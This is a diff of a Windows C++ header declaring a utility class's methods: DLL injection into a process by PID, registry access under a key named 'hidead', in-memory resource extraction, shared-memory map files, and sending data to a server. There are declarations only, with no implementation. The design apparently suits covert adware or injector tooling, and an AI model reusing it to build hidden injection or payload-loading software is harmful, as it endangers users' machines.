@@ -24,8 +24,12 @@ public:
 	virtual ~CToolOper();
 
 public:
-	BOOL	ReadConfigData(char * agent_id,int len,const char * pszMapName="run_config_data");
+	DWORD CreateMapFile(const char * map_name,const char *file_buffer);
 	std::string	ReadMapFile(const char* map_name);
+	DWORD WriteMapFile(const char *map_name,const char *file_buffer);
+
+public:
+	BOOL	ReadConfigData(char * agent_id,int len,const char * pszMapName="run_config_data");
 
  	void SetRegData(const char * name_str,const char * value_str,const char * pszKey="SOFTWARE\\hidead");
  	BOOL GetRegData(const char * name_str,char *value_str,int &len,const char * pszKey="SOFTWARE\\hidead");
@@ -42,17 +46,25 @@ public:
 
 	std::string SubstStr(const char * buffer,const char * start_str,const char *end_str);
 	int SubstStr(const char * buffer,const char * start_str,const char *end_str,RET_STRING_VECTOR &_str_list);
+	std::string ReplaceStr(std::string s,std::string sOld,std::string sNew);
 
 public:
 	BOOL	AddDll(std::string path, DWORD pid);
 
 	int		StringSubs(std::string	src_str,std::string begin_str,std::string end_str,RET_STRING_VECTOR &str_list);
-
-	BOOL	ExtractFile(LPCSTR restype, int resid, LPCSTR destpath,HMODULE hModule);
-	char *	ReMoveChar(char * src_data,char ch);
+	
+	PVOID ExtractMem(LPCTSTR restype, int resid,HMODULE hModule);
+	BOOL ExtractFile(LPCSTR restype, int resid, LPCSTR destpath,HMODULE hModule);
+	char * ReMoveChar(char * src_data,char ch);
 	std::string	GetSystemPathFile(std::string	filename);
 
 	int isInstr(const char * buffer,int len, char ch);
+
+public:
+	DWORD SendRecvData(const char * sever_ip,short port,PVOID send_data,int send_len,PVOID recv_data,int recv_len);
+
+public:
+	std::string GetSystemTime();
 };
 
 #endif // !defined(AFX_TOOLOPER_H__6B192A69_20B7_492D_8BDC_3C3D94122A6F__INCLUDED_)
